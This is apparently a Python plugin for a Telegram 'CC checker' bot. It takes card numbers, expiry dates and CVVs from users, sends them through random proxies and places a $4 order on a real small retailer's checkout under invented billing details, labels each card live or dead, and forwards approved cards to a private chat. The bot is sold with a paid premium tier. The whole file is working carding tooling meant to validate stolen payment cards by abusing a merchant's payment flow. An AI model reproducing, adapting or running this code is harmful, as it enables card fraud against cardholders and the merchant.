import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import names
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "PayFlow"
subtype = "$4"
command = "pfw"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def braintree1(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; _gat=1; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/teddys-america-packed-teddy-bears-patriotic-bear-cotton-fabric',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'orderbyfq': 'fq  checked',
            'addtocart_15687.EnteredQuantity': '1',
        }

        response = session.post('https://4my3boyz.com/addproducttocart/details/15687/1', headers=headers, data=data).text




        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            #'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7SKKe2IKCDsBFyTl',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; _gat=1; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/cart',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        files = {
            'outofstockrequest_836947': (None, '0'),
            'itemquantity836947': (None, '1'),
            'discountcouponcode': (None, ''),
            'giftcardcouponcode': (None, ''),
            'CountryId': (None, '0'),
            'StateProvinceId': (None, '0'),
            'ZipPostalCode': (None, ''),
            'checkout': (None, 'checkout'),
        }

        response = session.post('https://4my3boyz.com/cart', headers=headers, files=files).text

        response = session.get('https://4my3boyz.com/checkout', headers=headers).url

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'billing_address_id': '',
            'BillingNewAddress.Id': '0',
            'BillingNewAddress.FirstName': 'Juan',
            'BillingNewAddress.LastName': 'Smith',
            'BillingNewAddress.Address1': 'Street 16th av. billonarie',
            'BillingNewAddress.Address2': '',
            'BillingNewAddress.City': 'New York',
            'BillingNewAddress.CountryId': '81',
            'BillingNewAddress.StateProvinceId': '0',
            'BillingNewAddress.ZipPostalCode': '10080',
            'BillingNewAddress.Email': 'ivorycharisse@awgarstone.com',
            'BillingNewAddress.PhoneNumber': '3056473644',
            'BillingNewAddress.Company': '',
        }

        response = session.post('https://4my3boyz.com/checkout/OpcSaveBillingAddress/', headers=headers, data=data).text
        idship = parseX(response, 'data-addressid=\\"', '\\"')

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'shipping_address_id': idship,
            'shipping_address_cb': 'on',
            'ShippingNewAddress.Id': '0',
            'ShippingNewAddress.FirstName': '',
            'ShippingNewAddress.LastName': '',
            'ShippingNewAddress.Address1': '',
            'ShippingNewAddress.Address2': '',
            'ShippingNewAddress.City': '',
            'ShippingNewAddress.CountryId': '0',
            'ShippingNewAddress.StateProvinceId': '0',
            'ShippingNewAddress.ZipPostalCode': '',
            'ShippingNewAddress.Email': '',
            'ShippingNewAddress.PhoneNumber': '',
            'ShippingNewAddress.Company': '',
        }

        response = session.post('https://4my3boyz.com/checkout/OpcSaveShippingAddress/', headers=headers, data=data).text


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'shippingoption': 'International___Shipping.ByWeight',
        }

        response = session.post('https://4my3boyz.com/checkout/OpcSaveShippingMethod/', headers=headers, data=data).text


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'paymentmethod': 'Payments.PayPalDirect',
        }

        response = session.post('https://4my3boyz.com/checkout/OpcSavePaymentMethod/', headers=headers, data=data)


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'CreditCardType': 'Visa',
            'CardholderName': 'Juan Smith',
            'CardNumber': ccnum,
            'ExpireMonth': mes,
            'ExpireYear': ano,
            'CardCode': cvv,
        }

        response = session.post('https://4my3boyz.com/checkout/OpcSavePaymentInfo/', headers=headers, data=data)

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'Connection': 'keep-alive',
            # 'Content-Length': '0',
            # 'Cookie': 'ARRAffinity=e22ca0a067122273c1fbaa0142cdfac18e4192d02be292104ae66ec351b9e0f5; WAWebSiteSID=0d83e2e616da4540ab07e4f2299c55d1; Nop.customer=688d62ff-2bdd-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV877714115.1710776438; NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=15687&RecentlyViewedProductIds=2710&RecentlyViewedProductIds=4680; ASP.NET_SessionId=vbenxqxl20rxpoqrwf1pu3g4',
            'Origin': 'https://4my3boyz.com',
            'Referer': 'https://4my3boyz.com/onepagecheckout',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.post('https://4my3boyz.com/checkout/OpcConfirmOrder/', headers=headers).text

        code = parseX(response, 'LongMessage: ', '\\r')
        charge = parseX(response, '"success":', ',')

        if "true" in charge:
            msg = "APPROVED ✅"
            respuesta = "Charge $4."
            
            
        elif "This transaction cannot be processed. Please enter a valid Credit Card Verification Number." in code:
            msg = "APPROVED CCN✅"
            respuesta = "This transaction cannot be processed. Please enter a valid Credit Card Verification Number."

        else:
            msg = "DECLINED ❌"
            respuesta = code 
    except:
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    